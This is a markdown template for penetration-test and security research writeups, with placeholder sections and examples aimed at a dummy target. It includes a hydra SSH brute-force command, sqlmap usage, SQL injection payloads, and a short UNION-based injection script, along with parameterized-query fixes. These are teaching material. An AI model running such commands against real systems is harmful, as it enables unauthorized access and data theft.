# Comprehensive Security Writeup Template

A complete template demonstrating all common writeup sections, code blocks, images, and formatting best practices.

## Executive Summary

High-level overview of the topic, vulnerability, technique, or findings. Include:
- What was researched or tested
- Key findings or outcomes
- Potential impact or significance
- Who should care about this

## Table of Contents

1. [Introduction](#introduction)
2. [Background & Context](#background--context)
3. [Methodology](#methodology)
4. [Technical Deep Dive](#technical-deep-dive)
5. [Results & Findings](#results--findings)
6. [Proof of Concept](#proof-of-concept)
7. [Mitigation & Remediation](#mitigation--remediation)
8. [References & Further Reading](#references--further-reading)

## Introduction

Detailed introduction to the topic. Include:
- Problem statement
- Why this matters
- Scope of the writeup
- Target audience

## Background & Context

Contextual information including:
- Historical perspective
- Related vulnerabilities or techniques
- Industry standards or best practices
- Affected systems or populations

## Methodology

Describe the approach taken:

### Step 1: Reconnaissance
Early information gathering phase:
- Passive reconnaissance (OSINT, public databases)
- Target identification and scoping
- Initial footprinting

```bash
# Example reconnaissance commands
nmap -sV -p- target.example.com
whois target.example.com
```

### Step 2: Scanning & Analysis
Active probing and vulnerability identification:
- Port scanning and service enumeration
- Vulnerability scanning
- Configuration review

```python
# Example Python scanner
import socket

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"Port {port}: OPEN")
        sock.close()
    except Exception as e:
        print(f"Error scanning port {port}: {e}")

# Scan common ports
for p in [22, 80, 443, 3306, 5432]:
    scan_port("target.example.com", p)
```

### Step 3: Exploitation & Testing
Hands-on testing and exploitation:
- Exploit development
- Manual testing
- Attack chains

```bash
#!/bin/bash
# Example bash script for automation

TARGET="192.168.1.100"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Hydra brute force attempt
hydra -l admin -P $WORDLIST ssh://$TARGET

# SQL Injection test
sqlmap -u "http://$TARGET/login.php?user=" --dbs
```

## Technical Deep Dive

Detailed technical analysis:

### Vulnerability Details

#### Root Cause
Explain the underlying cause of the issue:
- Weak input validation
- Insecure deserialization
- Improper access controls
- Configuration issues

#### Impact Chain
```
User Input → Validation Bypass → SQL Injection → Database Access → Data Exfiltration
```

### Attack Surface

| Component | Risk Level | Description |
|-----------|-----------|-------------|
| Input validation | High | No sanitization of user input |
| Authentication | Critical | Weak default credentials |
| Network | Medium | Unnecessary services exposed |
| Database | High | SQL injection possible |

### Technical Analysis

Deep technical explanation with code samples:

```javascript
// Vulnerable code example
function getUserData(userId) {
  // VULNERABLE: Direct query concatenation
  const query = "SELECT * FROM users WHERE id = " + userId;
  return database.execute(query);
}

// SECURE: Parameterized queries
function getUserDataSecure(userId) {
  const query = "SELECT * FROM users WHERE id = ?";
  return database.execute(query, [userId]);
}
```

## Results & Findings

### Discovery Timeline
- **Phase 1**: Initial reconnaissance confirmed open ports and running services
- **Phase 2**: Vulnerability scanning identified SQL injection points
- **Phase 3**: Exploitation allowed database access and credential extraction

### Key Findings

1. **Critical Issue**: Unauthenticated remote code execution
   - CVSS Score: 9.8
   - Exploitable via: Network, no authentication required
   - Impact: Complete system compromise

2. **High Issue**: SQL injection in login form
   - CVSS Score: 7.2
   - Exploitable via: Web interface
   - Impact: Data exfiltration and manipulation

3. **Medium Issue**: Weak password policy
   - CVSS Score: 5.1
   - Exploitable via: Brute force attacks
   - Impact: Unauthorized account access

## Proof of Concept

Step-by-step reproduction guide:

### Prerequisites
- Linux system with netcat and curl installed
- Access to target network
- Basic command-line proficiency

### Exploitation Steps

1. First, identify the target:
```bash
ping target.example.com
nmap -p 22,80,443 target.example.com
```

2. Enumerate the web application:
```bash
curl -v http://target.example.com/
curl -v http://target.example.com/admin
```

3. Test for SQL injection:
```bash
# Test with standard SQL injection payload
curl "http://target.example.com/api/user.php?id=1' OR '1'='1"
```

4. Exploit the vulnerability:
```python
#!/usr/bin/env python3
import requests

# Target URL
TARGET = "http://target.example.com/api/user.php"

# SQL Injection payload
payload = "1' UNION SELECT user(), database(), version() -- "

response = requests.get(f"{TARGET}?id={payload}")
print(response.text)
```

### Expected Output
```
Current User: root@localhost
Database: vulnerable_app
Version: MySQL 5.7.30
Table name: users
```

## Mitigation & Remediation

### Immediate Actions (0-24 hours)
- Disable vulnerable service if possible
- Restrict network access to affected systems
- Rotate compromised credentials
- Enable audit logging

### Short-term (1-2 weeks)
- Apply security patches
- Update dependencies to fixed versions
- Implement rate limiting on authentication attempts
- Enable Web Application Firewall (WAF) rules

### Long-term (ongoing)
- Implement secure coding practices
- Regular security assessments and penetration testing
- Security awareness training for development team
- Code review processes for security issues

### Remediation Code

```python
# Original vulnerable code
def process_user_input(user_input):
    query = f"SELECT * FROM users WHERE name = '{user_input}'"
    return db.execute(query)

# Fixed with parameterized queries
def process_user_input_fixed(user_input):
    query = "SELECT * FROM users WHERE name = ?"
    return db.execute(query, (user_input,))

# Additional hardening
def process_user_input_hardened(user_input):
    # Validate input length
    if len(user_input) > 100:
        raise ValueError("Input too long")
    
    # Use parameterized queries
    query = "SELECT * FROM users WHERE name = ?"
    result = db.execute(query, (user_input,))
    
    # Log access
    logger.info(f"User lookup: {user_input}")
    
    return result
```

## References & Further Reading

### Official Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

### Related Vulnerabilities
- Blind SQL Injection (CWE-89)
- NoSQL Injection (CWE-943)
- Command Injection (CWE-78)

### Tools & Resources
- SQLMap: Automated SQL injection tool
- Burp Suite: Web Application Security Testing
- OWASP Juice Shop: Vulnerable practice app

### Further Reading
1. "The Web Application Hacker's Handbook" - Stuttard & Pinto
2. "SQL Injection Attacks and Defense" - Justin Clarke
3. OWASP SQL Injection Prevention Sheet

---

**Author**: [Your Name]  
**Date**: [Date Published]  
**Last Updated**: [Last Edit Date]

**Disclaimer**: This writeup is for educational and authorized testing purposes only. Unauthorized testing is illegal. Always obtain proper authorization before testing systems you do not own.
